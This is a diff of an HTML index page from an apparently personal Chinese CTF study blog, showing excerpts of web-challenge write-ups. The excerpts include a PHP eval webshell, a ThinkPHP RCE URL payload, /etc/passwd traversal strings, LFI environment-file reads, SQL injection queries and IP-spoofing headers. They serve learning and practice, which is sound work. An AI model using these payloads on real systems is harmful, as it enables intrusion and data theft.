@@ -178,43 +178,29 @@
   <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/15/JAVA/" aria-label="JAVA"></a>
+      <a class="post-link" href="/2025/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" aria-label="代码审计"></a>
     
     
     <div class="post-cover-left">
       
         
         
-          <img data-src="/covers/reimu.jpg" data-sizes="auto" alt="JAVA" class="lazyload">
+          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/cover/reimu%20and%20marisa.jpg" data-sizes="auto" alt="代码审计" class="lazyload">
         
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-15</span>
-        <span><span class="icon-pencil"></span>490 words</span>
-        <span><span class="icon-clock"></span>1 min</span>
+        <span><span class="icon-calendar"></span>2025-03-26</span>
+        <span><span class="icon-pencil"></span>897 words</span>
+        <span><span class="icon-clock"></span>4 mins</span>
       </div>
-      <h2 class="post-title">JAVA</h2>
+      <h2 class="post-title">代码审计</h2>
       <article class="post-article">
         
-          [RoarCTF 2019]Easy Java
-一个登入页面？试试看sql？发现不行
-完全不会！！！！
-查了才知道是类似文件读取漏洞
-1.打开help，提醒我们
-1java.io.FileNotFoundException:&amp;#123;help.docx&amp;#125;
+          常见绕过1.科学计数法：123if(isset($a) &amp;amp;&amp;amp; intval($a) &amp;gt; 6000000 &amp;amp;&amp;amp; strlen($a) &amp;lt;= 3)    #使用`2e9`来绕过
 
-那我们输入
-1http://9d67dba8-dd72-4813-ae85-2fe82f0224d5.node5.buuoj.cn:81/help.docx
-
-
-得到一个假文件。。。。只能找找其他的线索了
-我们可以发现在打开help时候会有
-1/Download?filename=help.docx
-
-
-我们可能可以读取配置文件
+2.弱对比绕过12345$d = array_search(&amp;quot;DGGJ&amp;quot;, $c[&amp;quot;n&amp;quot;]);$d === false?die(&amp;quot;no...&amp;quot;):NULL;foreach($c[&amp;quot;n&amp;quot;] as $key=&amp;gt;$val)&amp;#123;    $val===&amp;quot;DGGJ&amp;quot;?die(&amp;
         
       </article>
     </div>
@@ -227,35 +213,30 @@
   <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/12/%E5%85%B3%E4%BA%8E%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%A0%94%E7%A9%B6/" aria-label="关于伪协议的研究"></a>
+      <a class="post-link" href="/2025/03/25/NCTF/" aria-label="NCTF"></a>
     
     
     <div class="post-cover-right">
       
         
         
-          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/togele.jpg" data-sizes="auto" alt="关于伪协议的研究" class="lazyload">
+          <img data-src="/covers/辉夜与妹红.jpg" data-sizes="auto" alt="NCTF" class="lazyload">
         
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-12</span>
-        <span><span class="icon-pencil"></span>1.6k words</span>
-        <span><span class="icon-clock"></span>7 mins</span>
+        <span><span class="icon-calendar"></span>2025-03-25</span>
+        <span><span class="icon-pencil"></span>29 words</span>
+        <span><span class="icon-clock"></span>1 min</span>
       </div>
-      <h2 class="post-title">关于伪协议的研究</h2>
+      <h2 class="post-title">NCTF</h2>
       <article class="post-article">
         
-          伪协议的研究与利用伪代码的大小写是不影响伪代码的作用的！！！
-输入代码类：php://input
-用途：读取 HTTP 请求的原始 POST 数据流，直接执行代码。
-条件：allow_url_include=On（默认关闭）。
-CTF 应用：绕过对 $_POST 的过滤，直接传递 PHP 代码。
-（可以直接传递post的值，那些针对post的过滤就无用了）
+          很无语当我理解完考察什么东西的时候，nctf已经关闭了
 
-绕过原理：
-**$_POST**：在 PHP 中，$_POST 是一个超全局变量，用于接收通过 HTTP POST 方法提交的数据。当客户端以 application/x-www-form-urlencoded 或 multipart/f
+老人，地铁，手机
+
         
       </article>
     </div>
@@ -268,28 +249,38 @@ CTF 应用：绕过对 $_POST 的过滤，直接传递 PHP 代码。
   <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/12/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/" aria-label="[网鼎杯 2020 青龙组]AreUSerialz"></a>
+      <a class="post-link" href="/2025/03/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" aria-label="文件包含"></a>
     
     
     <div class="post-cover-left">
       
         
         
-          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/guanx-fufumi.jpg" data-sizes="auto" alt="[网鼎杯 2020 青龙组]AreUSerialz" class="lazyload">
+          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/%E8%BE%89%E5%A4%9C02.jpg" data-sizes="auto" alt="文件包含" class="lazyload">
         
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-12</span>
-        <span><span class="icon-pencil"></span>473 words</span>
-        <span><span class="icon-clock"></span>2 mins</span>
+        <span><span class="icon-calendar"></span>2025-03-24</span>
+        <span><span class="icon-pencil"></span>1.3k words</span>
+        <span><span class="icon-clock"></span>5 mins</span>
       </div>
-      <h2 class="post-title">[网鼎杯 2020 青龙组]AreUSerialz</h2>
+      <h2 class="post-title">文件包含</h2>
       <article class="post-article">
         
-          [网鼎杯 2020 青龙组]AreUSerialz（ez_反序列化漏洞）
-123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&amp;lt;?phpinclude(&amp;quot;flag.php&amp;quot;);highlight_file(__FILE__);class FileHandler &amp;#123;    protected $op;    p
+          路径规范化12345678./..//..//secret.txt....//./....//./secret.txt..././..././secret.txt....//....//....//etc/passwd
+
+多试试看，总会成功的
+怎么检验存在文件包含：看看是否存在这些函数
+这些函数会将目标文件内容作为PHP代码执行，是最高危的漏洞入口：
+1.执行文件函数(1) include()
+风险：包含并执行指定文件，文件不存在时仅警告。
+
+示例漏洞代码：
+12$file = $_GET[&amp;#x27;file&amp;#x27;];include($file); // 用户可控参数直接传递
+
+利用方
         
       </article>
     </div>
@@ -302,34 +293,36 @@ CTF 应用：绕过对 $_POST 的过滤，直接传递 PHP 代码。
   <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E7%A8%8B/" aria-label=""></a>
+      <a class="post-link" href="/2025/03/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc/" aria-label="攻防世界-misc"></a>
     
     
     <div class="post-cover-right">
       
         
         
-          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/%E5%8D%81%E5%85%AD%E5%A4%9C%E5%92%B2%E5%A4%9C%20(4).jpg;" data-sizes="auto" alt="" class="lazyload">
+          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/guanx-fufumi.jpg" data-sizes="auto" alt="攻防世界-misc" class="lazyload">
         
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-11</span>
-        <span><span class="icon-pencil"></span>2.3k words</span>
-        <span><span class="icon-clock"></span>10 mins</span>
+        <span><span class="icon-calendar"></span>2025-03-23</span>
+        <span><span class="icon-pencil"></span>1k words</span>
+        <span><span class="icon-clock"></span>3 mins</span>
       </div>
-      <h2 class="post-title"></h2>
+      <h2 class="post-title">攻防世界-misc</h2>
       <article class="post-article">
         
-          1. __construct()
-功能：构造函数，在创建对象时自动调用，用于初始化对象的属性。
+           （我觉得misc确实很有意思，稍微了解一点点吧）
+刷题：Banmabanma：直接在在线扫码即可Barcode Reader. Free Online Web Application
+得到：
 
-人话：类被使用就会被调用
+适合作为桌面1.解析是否存在隐写我们得到一张照片，在其他wp的建议下我们使用Stegsolve进行
+Stegsolve介绍：Stegsolve 是一款专注于图像隐写分析的工具，常用于 CTF 竞赛、网络安全检测和数字取证场景。它通过深度解析图像的像素和结构，帮助用户发现隐藏在图片中的秘密信息。
+核心功能
 
-示例：
-
-123456789101112class Person &amp;#123;    public $name;    public $age;    public function __construct($name, $age) &amp;#123;        $this-&amp;gt;name = $name;        $this-&amp;gt;age = $age;    &amp;#125;&amp;#125;$person = new Person(&amp;#x27;John&amp;#x27;,
+通道分析
+支持 RGB（红、绿、蓝）和 Alpha（透明度）通道的独立查看，通过切换不同通道可能
         
       </article>
     </div>
@@ -342,31 +335,33 @@ CTF 应用：绕过对 $_POST 的过滤，直接传递 PHP 代码。
   <div class="post-wrapper">
   <div class="post-wrap-left" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/03/11/%E5%85%B3%E4%BA%8Epop%E9%93%BE%E7%9A%84%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/" aria-label="关于pop链的深入研究"></a>
+      <a class="post-link" href="/2025/03/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web/" aria-label="攻防世界-web"></a>
     
     
     <div class="post-cover-left">
       
         
         
-          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/cover/reimu%20and%20marisa.jpg" data-sizes="auto" alt="关于pop链的深入研究" class="lazyload">
+          <img data-src="/covers/十六夜咲夜-cute.jpg" data-sizes="auto" alt="攻防世界-web" class="lazyload">
         
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-03-11</span>
-        <span><span class="icon-pencil"></span>5.6k words</span>
-        <span><span class="icon-clock"></span>26 mins</span>
+        <span><span class="icon-calendar"></span>2025-03-23</span>
+        <span><span class="icon-pencil"></span>9.5k words</span>
+        <span><span class="icon-clock"></span>41 mins</span>
       </div>
-      <h2 class="post-title">关于pop链的深入研究</h2>
+      <h2 class="post-title">攻防世界-web</h2>
       <article class="post-article">
         
-          关于POP链 (Property Oriented Programming Chain）：pop链漏洞通常是在用在有反序列化的程序当中，由于运用了大量的魔术方程，所以可能会出现一些纰漏，导致存在原生函数或者是更加明显的执行函数的被利用。（RCE，数据泄漏等等）
-关于原生函数：常见的原生函数：1`array_walk()`、`system()`、`eval()`、`unserialize()、exec()等
+           （在朋友的推荐下，我选择了攻防世界）
+php_rce考察点：ThinkPHP 5.1框架的远程代码执行漏洞（RCE）
+举例子代码：
+1?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id
 
-怎么利用原生函数？：system，eval，exec这几个可以直接或者半直接执行函数的就不仔细说了，为什么array_walk也会被利用呢？
-array_walk：12345678arra
+一、原理解析：漏洞是如何触发的？1. 参数拆解
+s=index/\think\app/invokefunction表示调用 think\App 类的 invokefunction 方法。ThinkPHP的路由解析允许通过URL参数直接指定类和方法，这是
         
       </article>
     </div>
@@ -379,196 +374,174 @@ array_walk：12345678arra
   <div class="post-wrapper">
   <div class="post-wrap-right" data-aos="fade-up">
     
-      <a class="post-link" href="/2025/02/27/Easy%20MD5%E7%BB%95%E8%BF%87/" aria-label=""></a>
+      <a class="post-link" href="/2025/03/23/%E4%B8%80%E4%BA%9B%E6%9F%A5%E8%AF%A2%E5%91%BD%E4%BB%A4/" aria-label="一些查询命令"></a>
     
     
     <div class="post-cover-right">
       
         
         
-          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/%E8%BE%89%E5%A4%9C02.jpg" data-sizes="auto" alt="" class="lazyload">
+          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/guanx-fufumi.jpg" data-sizes="auto" alt="一些查询命令" class="lazyload">
         
       
     </div>
     <div class="post-info">
       <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-27</span>
-        <span><span class="icon-pencil"></span>628 words</span>
-        <span><span class="icon-clock"></span>2 mins</span>
-      </div>
-      <h2 class="post-title"></h2>
-      <article class="post-article">
-        
-          Easy MD5绕过（本质应该还是sql注入）
-[BJDCTF2020]Easy MD5：前言：什么是MD5？一种加密方法，被发现存在碰撞漏洞后便不再使用
-加密原理如下：
-12md5(&amp;#x27;hello&amp;#x27;, true)md5(&amp;#x27;hello&amp;#x27;, false)
-
-
-并且会对’   ‘的内容优先做出如下做法：
-把字符串数字转化为数字：’1’&amp;#x3D;&amp;#x3D;&amp;#x3D;1
-会优先计算：’1+1’&amp;#x3D;&amp;#x3D;&amp;#x3D;’2’
-更加仔细的请访问：[buuctf web BJDCTF2020]Easy MD5-CSDN博客
-怎么解决强&amp;#x2F;弱运算
-        
-      </article>
-    </div>
-  </div>
-  </div>
-
-
-  
-  
-  <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/02/27/cookie%E6%AC%BA%E9%AA%97/" aria-label=""></a>
-    
-    
-    <div class="post-cover-left">
-      
-        
-        
-          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/%E7%BA%A2%E7%BE%8E%E9%93%83.jpg" data-sizes="auto" alt="" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-27</span>
-        <span><span class="icon-pencil"></span>299 words</span>
-        <span><span class="icon-clock"></span>1 min</span>
-      </div>
-      <h2 class="post-title"></h2>
-      <article class="post-article">
-        
-          [HCTF 2018]admin（session欺骗）前言：何为session?是cookie的一种，用于记录你这个ip的会话，相当于一个定位，让服务器能在茫茫网络当中找到你，继续上次的会话，一般是经过大量加密的，flask框架往往会保护，留下一个签名，但是签名不能防止篡改，存在可利用漏洞
-正片：进入源码发现
-说明我们需要成功登入admin才能获得flag
-方法一：弱爆破已知账号是admin，所以我们就尝试爆破，没想到密码非常简单，直接获得了flag
-方法二：flask_session欺骗我们先注册再登入，留下我们的session
-之后抓包或者使用插件得到session，再用准备好的解密pyt
-        
-      </article>
-    </div>
-  </div>
-  </div>
-
-
-  
-  
-  <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/02/27/%E4%B8%8D%E7%9F%A5%E9%81%93%E6%94%BE%E5%9C%A8%E5%93%AA%E9%87%8C%E7%9A%84%E7%AC%94%E8%AE%B0/" aria-label=""></a>
-    
-    
-    <div class="post-cover-right">
-      
-        
-        
-          <img data-src="/covers/全员02.jpg" data-sizes="auto" alt="" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-27</span>
-        <span><span class="icon-pencil"></span>180 words</span>
-        <span><span class="icon-clock"></span>1 min</span>
-      </div>
-      <h2 class="post-title"></h2>
-      <article class="post-article">
-        
-          在BUU中学到，不知道放在哪里的笔记[极客大挑战 2019]Http（伪造协议）打开源码，发现隐藏页面进入后发现
-提示我们要从这个页面中转过来，那就伪造Referer
-1Referer:https://Sycsecret.buuoj.cn
-
-点开如图所示：
-
-点开后发现，又提示我们要使用别的浏览器，那就伪装一个
-1User-Agent:Syclover
-
-
-又提示我们要使用本地访问，那就伪！
-1X-Forwarded-For :127.0.0.1
-
-
-补充：X-Forwarded-For（XFF）是一个在 HTTP 请求头中常用的字段，主要用于在代理服务器或负载均衡器等中间设备的环境下，记录客
-        
-      </article>
-    </div>
-  </div>
-  </div>
-
-
-  
-  
-  <div class="post-wrapper">
-  <div class="post-wrap-left" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/02/27/uploud%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/" aria-label=""></a>
-    
-    
-    <div class="post-cover-left">
-      
-        
-        
-          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/%E8%BE%89%E5%A4%9C%E4%B8%8E%E5%A6%B9%E7%BA%A2.jpg" data-sizes="auto" alt="" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-27</span>
-        <span><span class="icon-pencil"></span>413 words</span>
-        <span><span class="icon-clock"></span>1 min</span>
-      </div>
-      <h2 class="post-title"></h2>
-      <article class="post-article">
-        
-          BUU-upload实战——————————-在经历upload-labs后，我刷不明白，决定直接去实战试试看——————————-
-[极客大挑战 2019]Upload由于是第一次做upload，于是便主要是搜为主
-要考察的四个点：
-1234561.MIME类型（Content-Type: image/png）2.文件头（GIF89a）3.黑名单检测(phtml)4.检测&amp;lt;?（`&amp;lt;script language=&amp;quot;pHp&amp;quot;&amp;gt;@eval($_POST[&amp;#x27;cmd&amp;#x27;])&amp;lt;/script&amp;gt;`）&amp;lt;?php @eval($_PO
-        
-      </article>
-    </div>
-  </div>
-  </div>
-
-
-  
-  
-  <div class="post-wrapper">
-  <div class="post-wrap-right" data-aos="fade-up">
-    
-      <a class="post-link" href="/2025/02/27/sqli%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/" aria-label=""></a>
-    
-    
-    <div class="post-cover-right">
-      
-        
-        
-          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/hezhao%2002.jpg" data-sizes="auto" alt="" class="lazyload">
-        
-      
-    </div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span><span class="icon-calendar"></span>2025-02-27</span>
-        <span><span class="icon-pencil"></span>1.4k words</span>
+        <span><span class="icon-calendar"></span>2025-03-23</span>
+        <span><span class="icon-pencil"></span>1.5k words</span>
         <span><span class="icon-clock"></span>6 mins</span>
       </div>
-      <h2 class="post-title"></h2>
+      <h2 class="post-title">一些查询命令</h2>
       <article class="post-article">
         
-          sqli实战————————————在经历sqli-labs后，我决定去实战试试看（也就是刷刷ctf题目）——————————-
-**[**极客大挑战 2019]LoveSQL 1没有过滤
-1**union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=database()),3 or 1 = 1 #**
+          查文件：12345678910111213cat /(绝对路径) or (相对路径)特殊：查询环境变量：env/proc/1/environ&amp;#x27;&amp;#x27;&amp;#x27;权限要求高，普通用户可能无法直接读取。内容通常是系统级别的配置，敏感信息较少,但是有可能读取到flag&amp;#x27;&amp;#x27;&amp;#x27;/proc/self/environ  #在渗透测试中常用于 LFI（本地文件包含）漏洞利用，通过读取 Web 进程的环境变量获取敏感信息。
 
-查出Hello geekuser,l0ve1ysq1！(表)
-1**1&amp;#x27; union select 1,(select group_concat
+1print_r(scandir(current(localeconv())));   =  ls
+
+
+
+绕过1234567891011121
+        
+      </article>
+    </div>
+  </div>
+  </div>
+
+
+  
+  
+  <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/21/BaseCTF2024%E6%96%B0%E7%94%9F%E8%B5%9BAura%E9%85%B1%E7%9A%84%E7%A4%BC%E7%89%A9/" aria-label="Aura酱的礼物"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/cover/reimu.jpg" data-sizes="auto" alt="Aura酱的礼物" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-21</span>
+        <span><span class="icon-pencil"></span>745 words</span>
+        <span><span class="icon-clock"></span>3 mins</span>
+      </div>
+      <h2 class="post-title">Aura酱的礼物</h2>
+      <article class="post-article">
+        
+          考察什么？ping绕过，伪协议的利用，@绕过
+源码：12345678910111213141516171819202122232425&amp;lt;?phphighlight_file(__FILE__);// Aura 酱，欢迎回家~// 这里有一份礼物，请你签收一下哟~$pen = $_POST[&amp;#x27;pen&amp;#x27;];if (file_get_contents($pen)!== &amp;#x27;Aura&amp;#x27;)&amp;#123;    die(&amp;#x27;这是 Aura 的礼物，你不是 Aura！&amp;#x27;);&amp;#125;// 礼物收到啦，接下来要去博客里面写下感想哦~$challen
+        
+      </article>
+    </div>
+  </div>
+  </div>
+
+
+  
+  
+  <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/20/BaseCTF2024%E6%96%B0%E7%94%9F%E8%B5%9B/" aria-label="BaseCTF2024新生赛"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/%E7%BA%A2%E7%BE%8E%E9%93%83.jpg" data-sizes="auto" alt="BaseCTF2024新生赛" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-20</span>
+        <span><span class="icon-pencil"></span>247 words</span>
+        <span><span class="icon-clock"></span>1 min</span>
+      </div>
+      <h2 class="post-title">BaseCTF2024新生赛</h2>
+      <article class="post-article">
+        
+          1z_php（简单代码阅读）解题步骤：1.正确输入get请求（这个坑可真的是重量级）12345678910$emp=$_GET[&amp;#x27;e_m.p&amp;#x27;];$try=$_POST[&amp;#x27;try&amp;#x27;];if($emp!=&amp;quot;114514&amp;quot;&amp;amp;&amp;amp;intval($emp,0)===114514)&amp;#123;    for ($i=0;$i&amp;lt;strlen($emp);$i++)&amp;#123;        if (ctype_alpha($emp[$i]))&amp;#123;            die(&amp;quot;你不是hacker？那请去外场
+        
+      </article>
+    </div>
+  </div>
+  </div>
+
+
+  
+  
+  <div class="post-wrapper">
+  <div class="post-wrap-left" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/20/BJDCTF2020-The-mystery-of-ip/" aria-label="[BJDCTF2020]The mystery of ip"></a>
+    
+    
+    <div class="post-cover-left">
+      
+        
+        
+          <img data-src="https://github.com/Flight-star-cy/my-images/blob/main/%E5%A6%B9%E7%BA%A202.jpg" data-sizes="auto" alt="[BJDCTF2020]The mystery of ip" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-20</span>
+        <span><span class="icon-pencil"></span>227 words</span>
+        <span><span class="icon-clock"></span>1 min</span>
+      </div>
+      <h2 class="post-title">[BJDCTF2020]The mystery of ip</h2>
+      <article class="post-article">
+        
+          [BJDCTF2020]The mystery of ip考察什么？ip伪造，ssti注入
+题目：hint提醒我们ip，我们尝试伪造ip，下面是伪造ip的几种方式：
+12345678910111213141516171819Client-IP: 127.0.0.1Forwarded-For: 127.0.0.1Forwarded: 127.0.0.1Forwarded-For: localhostX-Forwarded-For-Original:127.0.0.1X-Forwarded-For-Original: localhostX-Forwarded-For: 127.0.0.1X-For
+        
+      </article>
+    </div>
+  </div>
+  </div>
+
+
+  
+  
+  <div class="post-wrapper">
+  <div class="post-wrap-right" data-aos="fade-up">
+    
+      <a class="post-link" href="/2025/03/19/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/" aria-label="[网鼎杯 2020 朱雀组]phpweb"></a>
+    
+    
+    <div class="post-cover-right">
+      
+        
+        
+          <img data-src="/covers/reimu.webp" data-sizes="auto" alt="[网鼎杯 2020 朱雀组]phpweb" class="lazyload">
+        
+      
+    </div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span><span class="icon-calendar"></span>2025-03-19</span>
+        <span><span class="icon-pencil"></span>708 words</span>
+        <span><span class="icon-clock"></span>3 mins</span>
+      </div>
+      <h2 class="post-title">[网鼎杯 2020 朱雀组]phpweb</h2>
+      <article class="post-article">
+        
+          [网鼎杯 2020 朱雀组]phpweb其实最开始我是觉得应该是抓包的，但是意识不够好，不知道post传输里面就是我们想要的敲门砖
+含泪看wp抓包，post运输有鬼
+
+第一个考点：去搜才知道这是Linux的date看日期函数，于是我们便尝试读取源文件：
+
+得到：
+123456789101112131415161718192021222324252627282930&amp;lt;?php    $disable_fun = array(&amp;quot;exec&amp;quot;,&amp;quot;shell_exec&amp;quot;,&amp;quot;system&amp;quot;,&amp;quot;passthru&amp;quot;,&amp;quo
         
       </article>
     </div>
@@ -581,7 +554,7 @@ array_walk：12345678arra
 
   <nav id="page-nav" data-aos="fade-up">
     
-    <a class="extend prev" rel="prev" href="/page/5/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/5/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/7/">Next &raquo;</a>
   </nav>
 
 
@@ -599,7 +572,7 @@ array_walk：12345678arra
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Posts</div>
-    <div class="sidebar-state-number">69</div>
+    <div class="sidebar-state-number">84</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
@@ -607,7 +580,7 @@ array_walk：12345678arra
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">11</div>
+    <div class="sidebar-state-number">12</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -672,10 +645,10 @@ array_walk：12345678arra
     
       <div>
         <span class="icon-brush"></span>
-        65.1k
+        79.7k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        05:01
+        06:09
       </div>
     
     
@@ -709,7 +682,7 @@ array_walk：12345678arra
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>Posts</div>
-    <div class="sidebar-state-number">69</div>
+    <div class="sidebar-state-number">84</div>
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
@@ -717,7 +690,7 @@ array_walk：12345678arra
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">11</div>
+    <div class="sidebar-state-number">12</div>
   </div>
 </div>
 <div class="sidebar-social">
